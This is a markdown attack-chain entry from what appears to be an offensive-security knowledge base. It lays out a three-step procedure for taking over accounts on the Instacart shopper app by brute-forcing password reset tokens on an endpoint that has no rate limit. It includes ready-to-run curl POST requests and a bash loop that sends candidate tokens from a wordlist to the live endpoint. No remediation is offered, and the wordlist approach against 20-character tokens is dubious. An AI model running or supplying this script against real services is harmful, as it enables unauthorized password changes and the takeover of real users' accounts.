---
tags:
  - brute-force
  - account-takeover
  - rate-limiting-bypass
  - password-reset
type: attack_chain
tools: []
tactics:
  - '[[Credential Access]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Initiate-Password-Reset-to-Understand-Token-Flow]]'
  - '[[procedures/Validate-and-Change-Password-with-Guessed-Token]]'
  - '[[procedures/Brute-Force-Reset-Tokens-via-Unlimited-Requests]]'
step_count: 3
techniques:
  - '[[Brute Force]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:33:06.597Z'
description: >-
  Multi-stage attack exploiting lack of rate limiting on password reset token
  validation to brute force 20-character tokens and achieve unauthorized account
  takeover.
skill_level: intermediate
impact_level: high
id: 3fcf4fbd-3bd9-4e42-b8f2-1cefd1596ebb
validated: true
mitre_tactics:
  - '[[Credential Access]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Valid Accounts]]'
---
# Brute Force Password Reset Tokens for Account Takeover in Instacart Shopper App

Multi-stage attack chain demonstrating a complete attack workflow exploiting the absence of rate limiting on the password reset endpoint in Instacart's shopper application. Attackers can brute force 20-character reset tokens by sending unlimited POST requests, leading to unauthorized password changes and full account takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initiate Reset Flow] --> B[Guess and Validate Token]
    B --> C[Brute Force Tokens]
    C --> D[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- Browser or HTTP client for initial reset

### Target Environment

- Web platform
- Instacart shopper app at https://shoppers.instacart.com
- No specific ports required (HTTPS/443)
- Network access to the public web endpoint

### Initial Access Requirements

- No credentials needed initially
- Email access if targeting a specific user (optional for testing flow)
- Ability to send HTTP POST requests

## Detailed Attack Procedures

### Step 1: Initiate Password Reset
procedure: [[procedures/Initiate-Password-Reset-to-Understand-Token-Flow]]

**Objective**: Trigger the password reset process to observe the token format and response behavior.

**Instructions**: Access the password reset page and submit a reset request for a target account to receive the reset email and analyze the token structure.

**Expected Output**: Email containing a 20-character reset_password_token in the reset link.

**Success Indicators**:
- Reset email received
- Token format confirmed as 20 alphanumeric characters

### Step 2: Validate Password with Guessed Token
procedure: [[procedures/Validate-and-Change-Password-with-Guessed-Token]]

**Objective**: Test a single guessed token by sending a POST request to the password endpoint and observing the response.

**Instructions**: Use [[commands/curl-post-password-reset]] to submit a guessed token along with a new password. Check for the 'Reset password token is invalid' error on failure.

```bash
curl -X POST https://shoppers.instacart.com/password \
  -d "utf8=%E2%9C%93" \
  -d "_method=put" \
  -d "authenticity_token=your_token_here" \
  -d "driver[reset_password_token]=guessed_token" \
  -d "driver[password]=new_password" \
  -d "driver[password_confirmation]=new_password" \
  -d "commit=Change+my+password" \
  -c cookies.txt
```

**Expected Output**: Error message for invalid token or success redirect on valid token.

**Success Indicators**:
- Invalid response confirms no rate limiting
- Valid token (if guessed) changes password

### Step 3: Brute Force Tokens
procedure: [[procedures/Brute-Force-Reset-Tokens-via-Unlimited-Requests]]

**Objective**: Systematically guess tokens by repeating POST requests without restrictions, eventually hitting a valid one.

**Instructions**: Script repeated use of [[commands/curl-post-password-reset]] with a wordlist of possible 20-character tokens (e.g., generated from common patterns). Monitor responses for success.

```bash
# Example loop in bash for brute forcing
for token in $(cat token_wordlist.txt); do
  curl -X POST https://shoppers.instacart.com/password \
    -d "utf8=%E2%9C%93" \
    -d "_method=put" \
    -d "authenticity_token=your_token_here" \
    -d "driver[reset_password_token]=$token" \
    -d "driver[password]=new_password" \
    -d "driver[password_confirmation]=new_password" \
    -d "commit=Change+my+password" \
    -c cookies.txt | grep -q "invalid" || echo "Valid token: $token"
done
```

**Expected Output**: Success on valid token, allowing password change without further auth.

**Success Indicators**:
- Unlimited requests possible without blocks
- Password changed for target account

## Attack Chain Summary

### Key Achievements

1. Bypassed rate limiting to enable brute force
2. Guessed 20-character token for unauthorized access
3. Achieved full account takeover via password reset

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Brute Force]] Brute Force
- [[Valid Accounts]] Valid Accounts

### MITRE ATT&CK Tactics

- [[Credential Access]] Credential Access
- [[Initial Access]] Initial Access

---
*Last updated: 2023-10-01T00:00:00Z*
